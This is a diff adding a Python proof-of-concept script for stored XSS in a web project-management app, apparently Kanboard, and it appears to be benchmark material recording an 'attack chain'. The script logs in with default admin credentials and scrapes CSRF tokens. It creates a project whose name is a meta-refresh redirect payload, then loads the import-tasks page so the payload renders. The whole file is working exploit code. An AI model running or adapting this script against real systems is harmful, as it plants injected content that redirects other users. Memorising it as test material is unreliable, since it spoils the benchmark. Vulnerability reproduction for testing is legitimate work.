@@ -1,0 +1,213 @@
+import re
+import time
+
+import requests
+from bs4 import BeautifulSoup
+from loguru import logger
+
+BASE_URL = 'http://localhost:8080'
+
+USERNAME = 'admin'
+PASSWORD = 'admin'
+NORMAL_PROJECT_NAME = 'project1'
+MALICIOUS_PROJECT_NAME = '<meta http-equiv="refresh" content="2;url=http://example.com/" />'
+
+s = requests.Session()  # Use a Session to keep login state
+
+
+def request_id(resp):
+    return resp.headers.get("X-Request-ID") or resp.headers.get("X-Request-Id")
+
+
+def log_response(label, resp, capture=False):
+    """Logs with capture=True are extracted into attack_rids.json as the core attack chain."""
+    rid_label = "X-Request-Id" if capture else "RID"
+    for idx, item in enumerate(list(resp.history) + [resp]):
+        hop = f" hop={idx}" if resp.history else ""
+        logger.info(f'{label}{hop}: {item.status_code} {rid_label}: {request_id(item)}')
+
+
+def html_2_json(html_str):
+    soup = BeautifulSoup(html_str, "html.parser")
+    result = {}
+
+    # 1. Extract CSRF tokens from common meta tags
+    metas = soup.find_all("meta")
+    csrf_meta = [
+        meta
+        for meta in metas
+        if meta.get("name", "").lower()
+        in {"csrf-token", "csrf_token", "_csrf", "xsrf-token", "x-csrf-token"}
+    ]
+    for meta in csrf_meta:
+        result["csrf_token"] = meta.get("content")
+
+    # 2. Extract CSRF and other security values from input elements
+    # Common key list; extend as needed
+    csrf_input_names = [
+        "csrfmiddlewaretoken",
+        "_csrf",
+        "csrf_token",
+        "csrf",
+        "authenticity_token",
+        "xsrf-token",
+        "token",
+        "requesttoken",
+        "__c"
+    ]
+    for name in csrf_input_names:
+        inp = soup.find("input", {"name": name})
+        if inp and inp.get("value"):
+            result["csrf_token"] = inp["value"]
+            break  # Stop once one is found
+
+    # 3. Handle key-value pairs such as <input name="project[namespace_id]" ...>
+    # Extract all input elements that have a value attribute
+    for inp in soup.find_all("input"):
+        name = inp.get("name")
+        value = inp.get("value")
+        if name and value:
+            # For example, name="project[namespace_id]"
+            if "[" in name and "]" in name:
+                key = name.split("[")[-1].replace("]", "")
+                result[key] = value
+            elif "token" in name.lower() or "id" in name.lower():
+                # For example, input name="user_id"
+                result[name] = value
+
+    # 4. Extract JS objects from HTML text, such as "csrfToken": "xxxx" or 'csrfToken': 'xxxx'
+    pattern_list = [
+        r'"csrfToke[n]?"\s*:\s*["\']([^"\']+)["\']',  # "csrfToken": "xxx"
+        r'name="_csrf"\s+value="([a-zA-Z0-9_\-]+)"',  # name="_csrf" value="xxx"
+        r'name="csrfmiddlewaretoken"\s+value="([a-zA-Z0-9_\-]+)"',  # Django
+        r'"x-csrf-token"\s*:\s*"([^"]+)"',
+        r'"authenticity_token"\s*:\s*"([^"]+)"',
+        r'CSRF\s*=\s*"([^"]+)"',
+        r'__c=([A-Za-z0-9]+)',
+    ]
+    for pattern in pattern_list:
+        m = re.search(pattern, html_str, re.IGNORECASE)
+        if m:
+            result["csrf_token"] = m.group(1)
+            break
+
+    # 5. Other common cases can be extended in the same way...
+
+    # 6. Add custom extraction for other key fields, such as namespace_id
+    namespace_input = soup.find("input", {"name": "project[namespace_id]"})
+    if namespace_input and namespace_input.get("value"):
+        result["namespace_id"] = namespace_input["value"]
+
+    # 7. Extract common hidden input parameters
+    for inp in soup.find_all("input", {"type": "hidden"}):
+        if inp.get("name") and inp.get("value"):
+            if inp.get("name") not in result:
+                result[inp.get("name")] = inp.get("value")
+
+    return result
+
+def attack():
+    # Preparation step: login and CSRF retrieval are not included in gold.
+    login_page = s.get(BASE_URL)
+    log_response('SETUP GET /', login_page, capture=False)
+    csrf_token = html_2_json(login_page.text).get("csrf_token")
+    if not csrf_token:
+        login_page = s.get(f'{BASE_URL}/login')
+        log_response('SETUP GET /login', login_page, capture=False)
+        csrf_token = html_2_json(login_page.text).get("csrf_token")
+
+    login_url = f'{BASE_URL}/?controller=AuthController&action=check'
+    data = {
+        'csrf_token': csrf_token,
+        'username': USERNAME,
+        'password': PASSWORD,
+        'remember_me': '1'
+    }
+    response = s.post(login_url, data=data)
+    log_response('SETUP POST /?controller=AuthController&action=check', response, capture=False)
+
+    # Core attack chain 1: create normal project project1; the later trigger page accesses this project's import/tasks.
+    normal_project_id = create_project(
+        NORMAL_PROJECT_NAME,
+        'CORE[1] POST create normal project project1',
+        capture=True,
+    )
+    if not normal_project_id:
+        raise RuntimeError('Failed to extract normal project ID')
+
+    # Core attack chain 2: create a malicious project with a meta-refresh payload and write stored XSS data.
+    malicious_project_id = create_project(
+        MALICIOUS_PROJECT_NAME,
+        'CORE[2] POST create malicious project stored XSS',
+        capture=True,
+    )
+    logger.success(f'Created malicious project with ID: {malicious_project_id}')
+
+    # Core attack chain 3: visit the import-tasks page; rendering the project name triggers meta refresh.
+    trigger_url = f'{BASE_URL}/project/{normal_project_id}/import/tasks'
+    trigger_response = s.get(trigger_url, allow_redirects=False)
+    log_response(
+        f'CORE[3] GET /project/{normal_project_id}/import/tasks trigger stored XSS',
+        trigger_response,
+        capture=True,
+    )
+    if MALICIOUS_PROJECT_NAME in trigger_response.text:
+        logger.success(f'Payload is present in /project/{normal_project_id}/import/tasks response')
+    else:
+        logger.warning('Payload was not found verbatim in /project/1/import/tasks response')
+    time.sleep(2)
+    logger.success('Waited 2 seconds; a browser would follow the meta refresh to http://example.com/')
+
+
+def get_create_project_csrf():
+    create_project_url = f'{BASE_URL}/project/create/personal'
+    headers = {
+        "X-Requested-With": "XMLHttpRequest"
+    }
+    create_project_response = s.get(create_project_url, headers=headers)
+    log_response('SETUP GET /project/create/personal', create_project_response, capture=False)
+    proj_create_csrf_token = html_2_json(create_project_response.text).get("csrf_token")
+    logger.debug(f'Extracted CSRF token: {proj_create_csrf_token}')
+    if not proj_create_csrf_token:
+        raise RuntimeError('Failed to extract project creation CSRF token')
+    return proj_create_csrf_token
+
+
+def build_project_form(name, csrf_token):
+    return {
+        "csrf_token": csrf_token,
+        "is_private": "",
+        "name": name,
+        "identifier": "",
+        "task_limit": "100",
+        "src_project_id": "0",
+        "projectPermissionModel": "1",
+        "projectRoleModel": "1",
+        "categoryModel": "1",
+        "tagDuplicationModel": "1",
+        "actionModel": "1",
+        "customFilterModel": "1",
+    }
+
+
+def extract_project_id(resp):
+    redirect = resp.headers.get("X-Ajax-Redirect") or resp.headers.get("Location")
+    return redirect.rstrip("/").split("/")[-1] if redirect else None
+
+
+def create_project(name, label, capture):
+    csrf_token = get_create_project_csrf()
+    create_url = f'{BASE_URL}/?controller=ProjectCreationController&action=save'
+    form_data = build_project_form(name, csrf_token)
+    headers = {
+        "X-Requested-With": "XMLHttpRequest",
+    }
+    create_response = s.post(create_url, data=form_data, headers=headers, allow_redirects=False)
+    log_response(label, create_response, capture=capture)
+    project_id = extract_project_id(create_response)
+    logger.success(f'Created project "{name}" with ID: {project_id}')
+    return project_id
+
+
+if __name__ == '__main__':
+    attack()
